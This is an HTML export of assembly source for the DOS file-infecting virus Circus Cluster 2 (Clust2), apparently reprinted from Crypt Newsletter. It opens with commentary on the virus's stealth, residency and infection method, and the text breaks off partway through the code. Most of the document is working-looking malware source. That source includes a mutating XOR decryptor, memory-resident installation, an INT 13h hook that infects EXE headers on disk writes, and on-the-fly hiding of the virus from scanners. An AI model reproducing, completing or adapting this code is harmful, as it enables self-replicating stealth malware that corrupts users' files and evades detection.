<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;The Circus Cluster 2 virus is an experiment which TridenT finished after</span><span class="sc0">
</span><span class="sc1">;the original Cluster virus was published in Crypt 17. The source</span><span class="sc0">
</span><span class="sc1">;code in its original form is provided now.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Credited to TridenT, Circus Cluster 2 uses some of</span><span class="sc0">
</span><span class="sc1">;the ideas of the Bulgarian virus known as The Rat.  The Rat was deemed</span><span class="sc0">
</span><span class="sc1">;tricky because it looked for "00" empty space below the header in</span><span class="sc0">
</span><span class="sc1">;an EXEfile - if it found enough room for itself, it wrote itself out</span><span class="sc0">
</span><span class="sc1">;to the empty space or "air" in the file.  This hid the virus in the </span><span class="sc0">
</span><span class="sc1">;file, but added no change in file size.  This is a nice theme - one</span><span class="sc0">
</span><span class="sc1">;made famous by the ZeroHunt virus which first did the same with</span><span class="sc0">
</span><span class="sc1">;.COMfiles.  In both cases, the viruses had to be picky about the</span><span class="sc0">
</span><span class="sc1">;files they infected, limiting their spread.  This is still true with</span><span class="sc0">
</span><span class="sc1">;Circus Cluster 2 - it's an effective virus, but an extremely picky</span><span class="sc0">
</span><span class="sc1">;one.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;First, Circus Cluster 2 will attempt to copy itself into</span><span class="sc0">
</span><span class="sc1">;the "air" in an EXEfile just below the file header, if there is</span><span class="sc0">
</span><span class="sc1">;enough room.  The most common candidates for infection are standard</span><span class="sc0">
</span><span class="sc1">;MS/PC-DOS utility programs, like FIND or FC, among others.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Because Circus Cluster installs its own INT 13 disk hander, it then can</span><span class="sc0">
</span><span class="sc1">;intercept all attempts to read from files for a quick look.</span><span class="sc0">
</span><span class="sc1">;For example, looking at a hex dump of a Cluster-infected .EXE,</span><span class="sc0">
</span><span class="sc1">;with Vern Berg's LIST, will show the files clean.  Now, boot</span><span class="sc0">
</span><span class="sc1">;the system clean and look again.  You'll see Cluster in the file's</span><span class="sc0">
</span><span class="sc1">;"00" space.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Additional notes by Black Wolf &amp; Urnst Kouch</span><span class="sc0">
</span><span class="sc1">;Crypt Newsletter 22. Circus Cluster 2 can be quickly assembled with</span><span class="sc0">
</span><span class="sc1">;the A86 shareware assembler.</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Clust2 virus by John Tardy / TridenT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name:  Clust2</span><span class="sc0">
</span><span class="sc1">; Aliases:     Cluster-II, Circus Clusters-II</span><span class="sc0">
</span><span class="sc1">; V Status:    Released</span><span class="sc0">
</span><span class="sc1">; Discovery:   Not (yet)</span><span class="sc0">
</span><span class="sc1">; Symptoms:    .EXE altered, possible "sector not found" errors on disk-drives,</span><span class="sc0">
</span><span class="sc1">;              decrease in aveable memory</span><span class="sc0">
</span><span class="sc1">; Origin:      The Netherlands</span><span class="sc0">
</span><span class="sc1">; Eff Length:  386 bytes (EXE size doesn't change)</span><span class="sc0">
</span><span class="sc1">; Type Code:   ORhE - Overwriting Resident .EXE Infector</span><span class="sc0">
</span><span class="sc1">; Detection Method:</span><span class="sc0">
</span><span class="sc1">; Removal Instructions: Delete infected files or copy infected files with the</span><span class="sc0">
</span><span class="sc1">;                       virus resident to a device driven unit.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; General Comments:</span><span class="sc0">
</span><span class="sc1">; The Clust2 virus is not yet submitted to any antiviral authority. It</span><span class="sc0">
</span><span class="sc1">; is from the TridenT Virus Research Centre and was written by someone</span><span class="sc0">
</span><span class="sc1">; calling himself John Tardy. When an infected program is started, Clust2</span><span class="sc0">
</span><span class="sc1">; will become resident in high memory, but below TOM. It hooks interrupt</span><span class="sc0">
</span><span class="sc1">; 13h and will try to load the program again. Because of its stealth</span><span class="sc0">
</span><span class="sc1">; abilities the original program is loaded and will execute normally.</span><span class="sc0">
</span><span class="sc1">; The Clust2 virus infects files when a write request for interrupt 13h</span><span class="sc0">
</span><span class="sc1">; is done. It will check if the buffer contains the 'MZ' signature and</span><span class="sc0">
</span><span class="sc1">; that the candidate file isn't larger than 65000 bytes, and if there are</span><span class="sc0">
</span><span class="sc1">; enough zeros in the EXE-header. If these conditions are met, Clust2</span><span class="sc0">
</span><span class="sc1">; will convert the EXE file to a COM file and inserts its code in the</span><span class="sc0">
</span><span class="sc1">; buffer, allowing the original write request to proceed. This way it</span><span class="sc0">
</span><span class="sc1">; evades critical errors. The Clust2 virus is also stealth and can't be</span><span class="sc0">
</span><span class="sc1">; detected with virus scanners or checksumming software if the virus is</span><span class="sc0">
</span><span class="sc1">; resident. File-length and date doesn't change regardless if Clust2</span><span class="sc0">
</span><span class="sc1">; is resident. It's also a slighty polymorphic virus, mutating a few</span><span class="sc0">
</span><span class="sc1">; bytes in its decryptor. A wildcarded search string is needed to find it.</span><span class="sc0">
</span><span class="sc1">; The following text is encrypted within the</span><span class="sc0">
</span><span class="sc1">; virus:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        "[Clust2]"</span><span class="sc0">
</span><span class="sc1">;        "JT / TridenT"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The Clust2 virus will not infect files on device driven units, like drives</span><span class="sc0">
</span><span class="sc1">; compressed with DoubleSpace. It will disinfect itself on the fly</span><span class="sc0">
</span><span class="sc1">; when copied to such a device.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Sometimes it will issue a "sector not found" error when a file is</span><span class="sc0">
</span><span class="sc1">; copied to a disk drive.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The Clust2 virus doesn't do anything beside replicate.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100H</span><span class="sc0">

</span><span class="sc5">JUMPIE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">JUMPER</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">180H</span><span class="sc0">

</span><span class="sc5">JUMPER</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CLC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">DECRLEN</span><span class="sc0">
</span><span class="sc5">MORPH</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">JASS</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DECR</span><span class="sc0">
</span><span class="sc5">DECRYPT</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TRIG</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">TRAG</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">TROG</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">TREG</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">DECRYPT</span><span class="sc0">

</span><span class="sc5">DECR</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3513H</span><span class="sc0">    
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; return interrupt 13h handler</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">OLD13</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc1">; segment: offset</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">OLD13</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FC80H</span><span class="sc0">   </span><span class="sc1">; compare with virus ID</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">EXIT</span><span class="sc0">        </span><span class="sc1">; terminate if virus resident</span><span class="sc0">

</span><span class="sc5">DOINST</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc0">       </span><span class="sc1">; empty disk buffers</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">   </span><span class="sc1">; last chain?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">                  </span><span class="sc1">; if not, terminate</span><span class="sc0">
</span><span class="sc5">RESIT</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc5">VIRPAR</span><span class="sc4">+</span><span class="sc2">19H</span><span class="sc0">   </span><span class="sc1">; subtract from MCB size</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12H</span><span class="sc4">],</span><span class="sc5">VIRPAR</span><span class="sc4">+</span><span class="sc2">19H</span><span class="sc0"> </span><span class="sc1">; subtract from</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">JUMPER</span><span class="sc0">                    </span><span class="sc1">; PSP top of memory</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12H</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; ES = new segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VIRLEN</span><span class="sc0">                    </span><span class="sc1">; virus length</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">                        </span><span class="sc1">; copy it into memory</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2513H</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">NEW13</span><span class="sc0">                     </span><span class="sc1">; set interrupt 13h </span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">                          </span><span class="sc1">; into virus</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">           </span><span class="sc1">; modify memory allocation</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">2CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SEEK</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; seek for file executed</span><span class="sc0">
        </span><span class="sc6">SCASW</span><span class="sc0">            </span><span class="sc1">; in environment</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">SEEK</span><span class="sc0">     </span><span class="sc1">; located after two 0's</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">EXEC</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                </span><span class="sc1">; ds = environment segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PARAM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FILENAME</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00H</span><span class="sc0">    </span><span class="sc1">; load &amp; execute file </span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4DH</span><span class="sc0">      </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">

</span><span class="sc5">OLD13</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ORG13</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD13</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; jump to old interrupt 13h</span><span class="sc0">

</span><span class="sc5">NEW13</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; is there a write to the disk?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">CHECKEXE</span><span class="sc0">        </span><span class="sc1">; if so, check for infection op.</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; is it a disk read?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">ORG13</span><span class="sc0">           </span><span class="sc1">; if not, to original int 13h</span><span class="sc0">
</span><span class="sc5">DO</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD13</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; call interrupt 13h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">7EEBH</span><span class="sc0">   </span><span class="sc1">; is sector infected?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc10">ERROR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">    </span><span class="sc1">; cover virus ID with 'MZ'</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VIRLEN</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc4">[</span><span class="sc2">80H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; hash virus from sector when read</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">STOSB</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">CHECKEXE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">   </span><span class="sc1">; is an .EXEfile being written?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">ORG13</span><span class="sc0">          </span><span class="sc1">; to original address if not</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc8">BX</span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">],(</span><span class="sc2">65000</span><span class="sc4">/</span><span class="sc2">512</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; is .EXEfile too large to</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">ORG13</span><span class="sc0">                  </span><span class="sc1">; convert? Compare with value</span><span class="sc0">
                           </span><span class="sc1">; = max size (6500) divided by</span><span class="sc0">
                           </span><span class="sc1">; sector size</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc4">[</span><span class="sc2">80H</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; look in the .EXEfile header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VIRLEN</span><span class="sc0">
</span><span class="sc5">FIND0</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">LOOPE</span><span class="sc0">   </span><span class="sc5">FIND0</span><span class="sc0">            </span><span class="sc1">; check if field was hashed to 0's</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">            </span><span class="sc1">; and exit</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">NO0</span><span class="sc0">              </span><span class="sc1">; if not</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">046CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">NOLOOPFLIP</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">TREG</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">NOLOOPFLIP</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">NOCLCFLIP</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">JUMPER</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">NOCLCFLIP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">VIRLEN</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc5">MORPH</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">TRIG</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">TRAG</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
